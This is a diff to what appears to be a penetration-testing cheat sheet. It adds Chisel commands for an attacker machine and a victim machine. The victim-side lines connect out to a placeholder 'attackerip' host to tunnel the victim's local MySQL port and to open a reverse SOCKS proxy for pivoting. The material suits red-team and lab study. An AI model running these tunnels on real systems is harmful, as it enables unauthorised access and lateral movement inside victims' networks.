@@ -1066,6 +1066,33 @@ auxiliary/server/socks_proxy
 ```
 <br>
 
+## Chisel
+
+### Port Forwarding
+
+#### Attacker Machine:
+```
+chisel server -p 6666 --reverse
+```
+
+#### Victim Machine:
+```
+chisel client attackerip:6666 R:2222:127.0.0.1:3306/tcp
+```
+<br>
+
+### SOCKS Proxy
+
+#### Attacker Machine:
+```
+chisel server -p 6666 --socks5 --reverse
+```
+
+#### Victim Machine:
+```
+chisel client attackerip:6666 R:5000:socks
+```
+
 # Active_Directory
 
 [Cheatsheet 1](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#asreproast)
